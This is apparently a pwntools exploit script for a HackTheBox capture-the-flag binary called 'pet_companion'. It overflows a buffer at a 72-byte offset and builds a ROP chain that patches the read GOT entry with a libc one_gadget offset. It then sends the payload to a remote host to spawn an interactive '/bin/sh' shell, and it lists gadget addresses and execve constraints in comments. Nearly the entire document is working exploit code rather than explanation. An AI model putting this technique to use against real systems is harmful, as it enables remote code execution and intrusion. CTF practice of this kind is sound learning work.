'''
cyclic 1024
cyclic -l raaa
68+4 == 72
'''

#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

offset = 72

elf = ELF('./pet_companion')
libc = ELF('./glibc/libc.so.6')

padding = offset*b'A'

#ip, port='161.35.168.118', 30070
ip, port = '94.237.59.34', 59604   #HTB
io = remote(ip,port)
#io = process('./pet_companion')

#0x0000000000401108 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
#0x004005e8: add [rbp-0x3d], ebx; nop [rax+rax]; rep ret;

#ropr void -m 10 #default ropr/ROP_gadget is not enought!!
#0x004011b2: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;
#0x0040073a: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret;


'''
one_gadget challenge/glibc/libc.so.6
0xc961a execve("/bin/sh", r12, r13)
constraints:
  [r12] == NULL || r12 == NULL
  [r13] == NULL || r13 == NULL

0xc961d execve("/bin/sh", r12, rdx)
constraints:
  [r12] == NULL || r12 == NULL
  [rdx] == NULL || rdx == NULL

0xc9620 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL


'''

one_gadget = 0x4f2a5
offset = one_gadget - libc.sym['read']

offset = 2**32 + offset
print(hex(offset))

read_got = elf.got['read']  #libc_base + libc.sym['read']
read_plt = elf.sym['read']

rop_chain = p64(0x0040073a) + p64(offset) + p64(read_got+0x3d) + p64(0)*4
rop_chain += p64(0x004005e8)
rop_chain += p64(read_plt)
#rop_chain += p64(read_got)  #error

payload = padding + rop_chain

io.sendline(payload)
io.interactive()

